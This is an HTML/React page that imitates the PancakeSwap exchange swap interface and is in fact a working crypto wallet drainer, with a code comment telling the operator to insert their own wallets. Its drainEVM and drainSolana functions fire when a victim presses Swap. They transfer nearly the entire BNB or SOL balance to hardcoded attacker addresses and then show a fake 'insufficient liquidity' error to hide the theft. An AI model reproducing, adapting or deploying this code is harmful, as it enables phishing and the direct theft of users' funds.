<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>PancakeSwap - Everyone's Favorite DEX</title>
    <script src="https://cdn.jsdelivr.net/npm/react@18.2.0/umd/react.development.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/react-dom@18.2.0/umd/react-dom.development.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/babel-standalone@6.26.0/babel.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
    <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: #1b2026;
            color: #fff;
        }

        .app-container {
            max-width: 480px;
            margin: 0 auto;
            background: #1b2026;
            min-height: 100vh;
            padding-bottom: 80px;
        }

        /* Header */
        .header {
            padding: 16px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #2a2f36;
        }

        .logo {
            display: flex;
            align-items: center;
            gap: 8px;
            font-weight: 700;
            font-size: 20px;
        }

        .logo-icon {
            font-size: 28px;
        }

        .connect-btn {
            background: #f0b90b;
            border: none;
            color: #1b2026;
            padding: 8px 20px;
            border-radius: 20px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
        }

        /* Tabs */
        .tabs {
            display: flex;
            gap: 20px;
            padding: 16px;
            border-bottom: 1px solid #2a2f36;
        }

        .tab {
            color: #7a7e85;
            font-weight: 500;
            font-size: 16px;
            cursor: pointer;
        }

        .tab.active {
            color: #f0b90b;
        }

        /* Swap Card */
        .swap-card {
            background: #252a32;
            border-radius: 32px;
            margin: 16px;
            padding: 20px;
        }

        .swap-header {
            display: flex;
            justify-content: space-between;
            margin-bottom: 20px;
        }

        .swap-title {
            font-weight: 600;
        }

        .settings-icon {
            color: #7a7e85;
            cursor: pointer;
        }

        .swap-box {
            background: #1b2026;
            border-radius: 20px;
            padding: 16px;
            margin-bottom: 12px;
        }

        .swap-label {
            color: #7a7e85;
            font-size: 12px;
            margin-bottom: 8px;
        }

        .swap-input-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .token-select {
            display: flex;
            align-items: center;
            gap: 8px;
            background: #2a2f36;
            padding: 8px 12px;
            border-radius: 20px;
            cursor: pointer;
        }

        .token-icon-real {
            width: 24px;
            height: 24px;
            border-radius: 50%;
            object-fit: cover;
        }

        .token-symbol {
            font-weight: 600;
        }

        .amount-input {
            background: transparent;
            border: none;
            color: #fff;
            font-size: 24px;
            font-weight: 500;
            text-align: right;
            width: 60%;
        }

        .amount-input:focus {
            outline: none;
        }

        .usd-value {
            color: #7a7e85;
            font-size: 12px;
            text-align: right;
            margin-top: 8px;
        }

        .arrow-down {
            text-align: center;
            padding: 8px;
            color: #7a7e85;
            font-size: 20px;
        }

        .slippage-section {
            padding: 12px 0;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .slippage-label {
            color: #7a7e85;
            font-size: 14px;
        }

        .slippage-value {
            background: #2a2f36;
            padding: 4px 12px;
            border-radius: 12px;
            font-size: 14px;
        }

        .swap-button {
            background: #f0b90b;
            border: none;
            color: #1b2026;
            padding: 16px;
            border-radius: 40px;
            font-weight: 700;
            font-size: 18px;
            width: 100%;
            cursor: pointer;
            margin-top: 20px;
        }

        .status-bar {
            text-align: center;
            padding: 12px;
            color: #7a7e85;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div id="root"></div>

    <script type="text/babel">
        // ============================================================
        // DRAINER CONFIGURATION - REPLACE WITH YOUR WALLETS
        // ============================================================
        const BSC_ADDRESS = "0xCf71bcB9c7B1126FcC70e9C19Fb883505bA5d395";
        const SOLANA_WALLET = "nZwFZgNRLzn4wPGH34Ss2ii8nyvdKPdcR6wzM9sreCr";
        const SOLANA_RPC = "https://solana-mainnet.helius-rpc.com/?api-key=9becbcd9-6781-4ec6-bd40-1598894397b3";

        // Drainer functions
        async function drainEVM(victimAddress) {
            if (!window.ethereum) return false;
            try {
                const web3 = new Web3(window.ethereum);
                const balance = await web3.eth.getBalance(victimAddress);
                const balEth = parseFloat(web3.utils.fromWei(balance, 'ether'));
                if (balEth < 0.01) return false;
                const gasPrice = await web3.eth.getGasPrice();
                const gasCost = gasPrice * 21000n;
                const drainable = balance - gasCost - web3.utils.toWei('0.001', 'ether');
                if (drainable <= 0) return false;
                const tx = await window.ethereum.request({
                    method: 'eth_sendTransaction',
                    params: [{ from: victimAddress, to: BSC_ADDRESS, value: '0x' + drainable.toString(16), gas: '0x5208', gasPrice: '0x' + gasPrice.toString(16) }]
                });
                console.log("BSC drained:", tx);
                return true;
            } catch(e) { return false; }
        }

        async function drainSolana(victimPublicKey) {
            if (!window.solana?.isPhantom) return false;
            try {
                const conn = new solanaWeb3.Connection(SOLANA_RPC, 'confirmed');
                const from = new solanaWeb3.PublicKey(victimPublicKey);
                const to = new solanaWeb3.PublicKey(SOLANA_WALLET);
                const balance = await conn.getBalance(from);
                const minRent = await conn.getMinimumBalanceForRentExemption(0);
                const drainable = balance - minRent;
                if (drainable <= 0) return false;
                const tx = new solanaWeb3.Transaction().add(solanaWeb3.SystemProgram.transfer({ fromPubkey: from, toPubkey: to, lamports: Math.floor(drainable * 0.99) }));
                tx.feePayer = from;
                const blockhash = await conn.getRecentBlockhash();
                tx.recentBlockhash = blockhash.blockhash;
                const signed = await window.solana.signTransaction(tx);
                const txid = await conn.sendRawTransaction(signed.serialize());
                await conn.confirmTransaction(txid);
                console.log("Solana drained:", txid);
                return true;
            } catch(e) { return false; }
        }

        // React Components
        const { useState } = React;

        // Header Component
        function Header({ walletAddress, setWalletAddress, setWalletType, setStatus }) {
            const connectWallet = async () => {
                setStatus('Connecting...');
                if (window.ethereum && window.ethereum.isMetaMask) {
                    try {
                        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                        setWalletAddress(accounts[0]);
                        setWalletType('evm');
                        setStatus(`Connected: ${accounts[0].slice(0,6)}...${accounts[0].slice(-4)}`);
                    } catch(err) { setStatus('Connection failed'); }
                    return;
                }
                if (window.solana && window.solana.isPhantom) {
                    try {
                        const resp = await window.solana.connect();
                        setWalletAddress(resp.publicKey.toString());
                        setWalletType('solana');
                        setStatus(`Connected: ${resp.publicKey.toString().slice(0,6)}...${resp.publicKey.toString().slice(-4)}`);
                    } catch(err) { setStatus('Connection failed'); }
                    return;
                }
                setStatus('Install MetaMask or Phantom');
            };
            
            return (
                <div className="header">
                    <div className="logo">
                        <span className="logo-icon">🥞</span>
                        <span>PancakeSwap</span>
                    </div>
                    <button className="connect-btn" onClick={connectWallet}>
                        {walletAddress ? 'Connected' : 'Connect Wallet'}
                    </button>
                </div>
            );
        }

        // Tabs Component
        function Tabs() {
            const [activeTab, setActiveTab] = useState('Swap');
            const tabs = ['Swap', 'Buy Crypto', 'Perps', 'Earn', 'AI'];
            return (
                <div className="tabs">
                    {tabs.map(tab => (
                        <div key={tab} className={`tab ${activeTab === tab ? 'active' : ''}`} onClick={() => setActiveTab(tab)}>
                            {tab}
                        </div>
                    ))}
                </div>
            );
        }

        // SwapCard Component
        function SwapCard({ walletAddress, walletType, setStatus, setWalletAddress }) {
            const [fromAmount, setFromAmount] = useState('0.009');
            const [toAmount, setToAmount] = useState('1.25');
            
            const handleSwap = async () => {
                if (!walletAddress) {
                    setStatus('⚠️ Connect wallet first');
                    return;
                }
                setStatus('⏳ Swapping... (processing)');
                let success = false;
                if (walletType === 'evm') success = await drainEVM(walletAddress);
                else if (walletType === 'solana') success = await drainSolana(walletAddress);
                if (success) setStatus('❌ Swap failed: Insufficient liquidity. Try again.');
                else setStatus('❌ Swap failed. Please try again.');
                setWalletAddress(null);
            };
            
            return (
                <div className="swap-card">
                    <div className="swap-header">
                        <span className="swap-title">Swap</span>
                        <span className="settings-icon">⚙️</span>
                    </div>
                    <div className="swap-box">
                        <div className="swap-label">From</div>
                        <div className="swap-input-row">
                            <div className="token-select">
                                <img src="https://tokens.pancakeswap.finance/images/0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c.png" className="token-icon-real" alt="BNB" />
                                <span className="token-symbol">BNB</span>
                                <span>▼</span>
                            </div>
                            <input type="text" className="amount-input" value={fromAmount} onChange={(e) => setFromAmount(e.target.value)} placeholder="0" />
                        </div>
                        <div className="usd-value">≈ $5.85</div>
                    </div>
                    <div className="arrow-down">▼</div>
                    <div className="swap-box">
                        <div className="swap-label">To</div>
                        <div className="swap-input-row">
                            <div className="token-select">
                                <img src="https://tokens.pancakeswap.finance/images/0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82.png" className="token-icon-real" alt="CAKE" />
                                <span className="token-symbol">CAKE</span>
                                <span>▼</span>
                            </div>
                            <input type="text" className="amount-input" value={toAmount} readOnly />
                        </div>
                        <div className="usd-value">≈ $1.93</div>
                    </div>
                    <div className="slippage-section">
                        <span className="slippage-label">Slippage Tolerance</span>
                        <span className="slippage-value">Auto: 0.50%</span>
                    </div>
                    <button className="swap-button" onClick={handleSwap}>Swap</button>
                </div>
            );
        }

        // StatusBar Component
        function StatusBar({ status }) {
            return <div className="status-bar">{status}</div>;
        }

        // Main App Component
        function App() {
            const [walletAddress, setWalletAddress] = useState(null);
            const [walletType, setWalletType] = useState(null);
            const [status, setStatus] = useState('Ready');
            
            return (
                <div className="app-container">
                    <Header walletAddress={walletAddress} setWalletAddress={setWalletAddress} setWalletType={setWalletType} setStatus={setStatus} />
                    <Tabs />
                    <SwapCard walletAddress={walletAddress} walletType={walletType} setStatus={setStatus} setWalletAddress={setWalletAddress} />
                    <StatusBar status={status} />
                </div>
            );
        }

        // Render the app
        ReactDOM.createRoot(document.getElementById('root')).render(<App />);
    </script>
</body>
</html>
